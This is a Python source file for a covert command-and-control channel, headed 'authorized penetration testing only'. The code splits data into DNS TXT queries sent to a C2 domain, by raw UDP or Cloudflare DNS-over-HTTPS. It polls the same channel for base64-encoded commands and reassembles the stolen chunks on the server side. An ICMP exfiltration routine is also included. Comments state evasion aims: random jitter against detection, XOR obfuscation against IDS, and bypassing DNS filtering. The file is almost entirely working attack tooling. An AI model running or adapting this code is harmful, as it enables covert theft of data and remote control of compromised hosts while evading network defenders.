"""
DNS C2 Channel — authorized penetration testing only.
Exfiltrates/receives data via DNS TXT queries when HTTP is blocked.
Uses Cloudflare/Google DoH as transport (HTTPS, blends with normal DNS traffic).

Architecture:
  Agent → DNS TXT query for <encoded_data>.<domain> → DNS server (C2-controlled)
  Agent ← DNS TXT response with base64-encoded command ← DNS server

For DoH fallback (no DNS server control needed):
  Agent → GET https://cloudflare-dns.com/dns-query?name=<data>.c2.domain&type=TXT
  C2 serves TXT records via /dns endpoint that DoH providers read (via authoritative NS)
"""
import base64, socket, struct, os, sys, time, random
import urllib.request as _req

# ── Configuration ─────────────────────────────────────────────────────────────
DNS_DOMAIN  = os.environ.get("DNS_C2_DOMAIN", "")   # your C2 domain, e.g. "c2.example.com"
DOH_URL     = "https://cloudflare-dns.com/dns-query"
DNS_SERVER  = os.environ.get("DNS_C2_SERVER", "")   # your authoritative DNS server IP

CHUNK_SIZE  = 40   # max label length in DNS name
MAX_LABELS  = 3    # max data labels per query

# ── Encoding ─────────────────────────────────────────────────────────────────
def _encode_chunk(data: bytes) -> str:
    """Base32-encode (DNS-safe, no padding issues) a chunk of bytes."""
    return base64.b32encode(data).decode().lower().rstrip("=")

def _decode_chunk(s: str) -> bytes:
    s = s.upper()
    pad = (8 - len(s) % 8) % 8
    return base64.b32decode(s + "="*pad)

def _chunk_data(data: bytes) -> list:
    """Split data into DNS-label-sized chunks."""
    enc = _encode_chunk(data)
    return [enc[i:i+CHUNK_SIZE] for i in range(0, len(enc), CHUNK_SIZE)]

# ── Raw DNS query builder ─────────────────────────────────────────────────────
def _build_dns_query(fqdn: str, qtype: int = 16) -> bytes:
    """Build a raw DNS TXT query packet."""
    tid = random.randint(1, 0xFFFF)
    header = struct.pack(">HHHHHH", tid, 0x0100, 1, 0, 0, 0)
    labels = b""
    for part in fqdn.rstrip(".").split("."):
        enc = part.encode()
        labels += struct.pack("B", len(enc)) + enc
    labels += b"\x00"
    question = labels + struct.pack(">HH", qtype, 1)  # TXT, IN
    return header + question, tid

def _parse_dns_txt(response: bytes) -> list:
    """Parse TXT record strings from DNS response."""
    try:
        an_count = struct.unpack_from(">H", response, 6)[0]
        if not an_count: return []
        # Skip header (12b) + question section
        offset = 12
        # Skip question
        while offset < len(response) and response[offset] != 0: offset += 1
        offset += 5  # null byte + QTYPE + QCLASS
        results = []
        for _ in range(an_count):
            if offset >= len(response): break
            # Skip name (may be compressed)
            if response[offset] & 0xC0 == 0xC0:
                offset += 2
            else:
                while offset < len(response) and response[offset] != 0: offset += 1
                offset += 1
            rtype, rclass, ttl = struct.unpack_from(">HHI", response, offset)
            rdlen = struct.unpack_from(">H", response, offset+8)[0]
            offset += 10
            if rtype == 16:  # TXT
                rdata = response[offset:offset+rdlen]
                pos = 0
                txt = ""
                while pos < len(rdata):
                    slen = rdata[pos]; pos += 1
                    txt += rdata[pos:pos+slen].decode(errors="replace"); pos += slen
                results.append(txt)
            offset += rdlen
        return results
    except: return []

# ── DNS query (direct UDP) ────────────────────────────────────────────────────
def query_txt_udp(fqdn: str, server: str = "8.8.8.8") -> list:
    """Send DNS TXT query directly via UDP."""
    try:
        pkt, tid = _build_dns_query(fqdn)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)
        s.sendto(pkt, (server, 53))
        resp, _ = s.recvfrom(4096)
        s.close()
        return _parse_dns_txt(resp)
    except: return []

# ── DNS query via DoH (HTTPS, bypasses DNS filtering) ────────────────────────
def query_txt_doh(fqdn: str) -> list:
    """DNS-over-HTTPS TXT query — blends with normal HTTPS traffic."""
    try:
        import json
        url = f"{DOH_URL}?name={fqdn}&type=TXT"
        req = _req.Request(url, headers={"Accept": "application/dns-json"})
        resp = _req.urlopen(req, timeout=8)
        data = json.loads(resp.read())
        return [a.get("data","").strip('"')
                for a in data.get("Answer",[]) if a.get("type")==16]
    except: return []

# ── Agent-side: exfiltrate data via DNS ──────────────────────────────────────
def dns_exfil(data: str, domain: str = DNS_DOMAIN, aid: str = "") -> bool:
    """Send data to C2 via DNS TXT queries."""
    if not domain: return False
    try:
        chunks = _chunk_data(data.encode())
        total = len(chunks)
        for i, chunk in enumerate(chunks):
            # Format: <seq>-<total>-<aid_short>.<chunk>.<domain>
            aid_short = aid[:6] if aid else "anon"
            fqdn = f"{i}-{total}-{aid_short}.{chunk}.{domain}"
            if DNS_SERVER:
                query_txt_udp(fqdn, DNS_SERVER)
            else:
                query_txt_doh(fqdn)
            time.sleep(random.uniform(0.5, 2.0))  # jitter to avoid detection
        return True
    except: return False

# ── Agent-side: poll for commands via DNS ────────────────────────────────────
def dns_poll(domain: str = DNS_DOMAIN, aid: str = "") -> str:
    """Poll C2 for commands via DNS TXT query."""
    if not domain: return ""
    try:
        aid_short = aid[:6] if aid else "anon"
        fqdn = f"poll.{aid_short}.{domain}"
        txts = []
        if DNS_SERVER:
            txts = query_txt_udp(fqdn, DNS_SERVER)
        if not txts:
            txts = query_txt_doh(fqdn)
        for txt in txts:
            if txt.startswith("cmd:"):
                try: return base64.b64decode(txt[4:]).decode()
                except: return txt[4:]
        return ""
    except: return ""

# ── C2-side: TXT record server ────────────────────────────────────────────────
# These functions are called from c2_server.py to handle DNS C2 data

_pending_dns: dict = {}   # aid → queue of exfil chunks
_pending_cmds: dict = {}  # aid → pending command

def c2_store_cmd(aid: str, cmd: str):
    """Store command for agent to pick up via DNS poll."""
    _pending_cmds[aid] = base64.b64encode(cmd.encode()).decode()

def c2_get_cmd_txt(aid_short: str) -> str:
    """Return TXT record value for a poll query."""
    for aid, cmd_b64 in list(_pending_cmds.items()):
        if aid.startswith(aid_short) or aid_short in aid:
            del _pending_cmds[aid]
            return f"cmd:{cmd_b64}"
    return "cmd:" + base64.b64encode(b"PING").decode()

def c2_receive_chunk(seq: int, total: int, aid_short: str, chunk: str) -> str:
    """Receive an exfil chunk, reassemble when complete. Returns data or ''."""
    key = (aid_short, total)
    if key not in _pending_dns: _pending_dns[key] = {}
    _pending_dns[key][seq] = chunk
    if len(_pending_dns[key]) >= total:
        enc = "".join(_pending_dns[key][i] for i in range(total))
        del _pending_dns[key]
        try: return _decode_chunk(enc).decode(errors="replace")
        except: return enc
    return ""

# ── ICMP C2 channel ───────────────────────────────────────────────────────────
def icmp_exfil(data: str, target_ip: str) -> bool:
    """
    Exfiltrate data via ICMP echo payload.
    Requires raw socket (root on Linux, admin on Windows).
    Payload is XOR-obfuscated to avoid IDS.
    """
    try:
        key = 0xAA
        payload = bytes(b^key for b in data.encode())
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        # Chunk into 60-byte ICMP payloads
        for i in range(0, len(payload), 60):
            chunk = payload[i:i+60]
            # ICMP echo request header: type=8, code=0, checksum, id, seq
            icmp_id = random.randint(1, 0xFFFF)
            pkt = struct.pack(">BBHHH", 8, 0, 0, icmp_id, i//60) + chunk
            # Calculate checksum
            s = sum(struct.unpack(">%dH" % (len(pkt)//2), pkt)) if len(pkt)%2==0 \
                else sum(struct.unpack(">%dH" % (len(pkt)//2), pkt[:-1]))
            chk = (~((s>>16)+(s&0xFFFF)) & 0xFFFF)
            pkt = struct.pack(">BBHHH", 8, 0, chk, icmp_id, i//60) + chunk
            sock.sendto(pkt, (target_ip, 0))
            time.sleep(0.05)
        sock.close()
        return True
    except: return False
